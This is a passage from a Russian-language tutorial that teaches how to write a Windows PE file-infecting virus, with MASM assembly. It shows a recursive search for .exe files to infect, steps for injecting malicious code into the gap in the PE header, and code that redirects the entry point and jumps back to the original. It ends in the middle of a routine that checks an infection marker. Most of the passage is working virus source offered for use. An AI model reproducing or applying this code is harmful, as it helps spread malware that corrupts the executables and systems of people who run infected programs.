&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Find<span style="color: #339933;">.</span>cFileName<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; lstrlen<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>Find<span style="color: #339933;">.</span>cFileName<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Path<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; Mask2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; FindEXE &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;рекурсивный вызов</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">std</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Path<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; lstrlen<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10000</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'\'</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repne</span> &nbsp; <span style="color: #00007f; font-weight: bold;">scasb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0f3h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ELSE<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Не EXE ли это</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Find<span style="color: #339933;">.</span>cFileName&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;не exe ли это?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; lstrlen<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span>==<span style="color: #7f007f;">'exe.'</span><span style="color: black;">&#41;</span>||<span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span>==<span style="color: #7f007f;">'EXE.'</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;EXE ФАЙЛ НАЙДЕН!!!</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; FindNextFile<span style="color: #339933;">,</span>hFile<span style="color: #339933;">,</span>ADDR Find&nbsp; &nbsp; <span style="color: black; font-style: italic;">;продолжение поиска</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDW<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popad</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
FindEXE endp<br />
<span style="color: black; font-style: italic;">;=================================================================</span><br />
<span style="color: black; font-style: italic;">;Конец Процедуры FindEXE рекурсивного поиска файлов</span><br />
<span style="color: black; font-style: italic;">;=================================================================</span><br />
&nbsp;</div>
<h3><a name="c2x"></a>Проверка PE-файла на правильность</h3>
<p>Как проверить, что PE-файл является вилидным я рассказывал в главе 1. Просто, используйте процедуру ValidPE, передавая ей правильные параметры.</p>
<h3><a name="c2y"></a>Способ 1. Внедрение в заголовок</h3>
<p>У нас в распоряжении есть исполняемый файл, мы должны заразить его. Давайте рассмотрим первый способ. Как Вы уже знаете, в начале PE-файла идtn PE-заголовок. Между окончанием таблицы секции и первой секцией есть промежуток. Этот промежуток появляется из-за файлового выравнивания выравнивания (значение FileAlignment в файловом заголовке). Туда мы можем впихнуть исполняемый вредоносный код. Плохо, что места мало, значит либо наш вирус будет очень маленьким или очень оптимизированным, либо в это место мы внедрим только часть вируса. Хорошо то, что размер файла не изменяется. Запись в данную область возможна, если изменить атрибуты соответствующих страниц. Рассмотрим алгоритм внедрения кода, используя запись в заголовок:</p>
<ol>
	<li>Найти конец таблицы секций</li>
	<li>Найти физическое смещение 1 секции</li>
	<li>Вычислить максимальный размер кода, который можно внедрить</li>
	<li>Проверить bound-импорты. Если они присутствуют, то уничтожить запись о них в таблице директорий.</li>
	<li>Записать код.</li>
	<li>В конец кода установить jmp нормальную AddressOfEntryPoint</li>
	<li>Изменить AddressOfEntryPoint</li>
	<li>Изменить SizeOfHeaders на физическое смещение последней секции</li>
</ol>
<p>Есть шаги, которые необходимо будет выполнять при любом способе заражения. Я опишу их в каждом разделе.</p>
<h3><a name="c2z"></a>Получение важных частей отображения</h3>
<p>При работе с PE-файлом мы будем постоянно обращаться к некоторым областям, важными для нас. Необходимо получить указатели на них, чтобы постоянно не вычислять эти значения. Нам будут нужны следующие значения: PE-заголовок, таблица секций, таблица директорий, файловый заголовок, опциональный заголовок. В этом примере кода, предполагается что в hMap находиться проекция EXE-файла-жертвы.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #0000ff; font-weight: bold;">.data</span>?<br />
pPE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br />
pSectionTable &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br />
pDataDirectory&nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br />
pFileHeader &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br />
pOptionalHeader <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br />
<span style="color: black; font-style: italic;">;.........</span><br />
<span style="color: black; font-style: italic;">;Получение адреса PE-заголовка</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_DOS_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>hMap<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>e_lfanew<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; pPE<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Получение адреса файлового заголовка</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; pFileHeader<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Получение адреса опционального заголовка</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>sizeof IMAGE_FILE_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; pOptionalHeader<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Получение адреса таблицы директорий</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_OPTIONAL_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>DataDirectory<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; pDataDirectory<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Получение адреса талицы секций</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pOptionalHeader<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>NumberOfRvaAndSizes<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pDataDirectory<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>sizeof IMAGE_DATA_DIRECTORY<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mul</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; pSectionTable<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp;</div>
<h3><a name="c2aa"></a>Переход на старый AddressOfEntryPoint</h3>
<p>Когда мы внедряем код, то мы изменяем точку входа на нашу. Чтобы управление вернулось программе необходимо прыгнуть на инструкции, с которых первоначально планировалось выполнение. Ниже приведен отрывок кода, который добавляет инструкции после внедренного кода для перехода на оригинальную точку входа. Предполагается, что в pOptionalHeader находиться указатель на опциональный заголовок. Так же предполагается, что в регистре EDI находиться место, куда мы хотим записать команды перехода. Проекция EXE файла создается не как SEC_IMAGE, а как обычная, потому что при SEC_IMAGE запись на диск не производиться :(, даже если мы изменяем атрибуты страниц с помощью VirtualProtect</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Переход на старую точку входа</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>pOptionalHeader<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_OPTIONAL_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>AddressOfEntryPoint &nbsp; <span style="color: black; font-style: italic;">;В EAX - старая точка входа</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">ImageBase</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0BFh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;BF - опкод команды mov edi,XXXXXXX</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Джампим к старой точке входа</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0E7FFh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;FFE7 - опкод команды jmp edi</span><br />
&nbsp;</div>
<h3><a name="c2ab"></a>Код инфектора</h3>
<p>Сначала мы получаем все важные части отображения. После проецирования файла проверяем корректен ли он. Если он корректен, то проверяем, не заражен ли он уже. Чтобы это проверить, надо знать некоторые отличительные особенности зараженности данного файла. При самом заражении в поле Win32VersionValue добавляются байты - 00BADF11Eh. Если в данном поле такие байты, то файл заражен. Посмотрите на пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Не заражен ли уже файл?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pOptionalHeader<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>PTR IMAGE_OPTIONAL_HEADER<br />
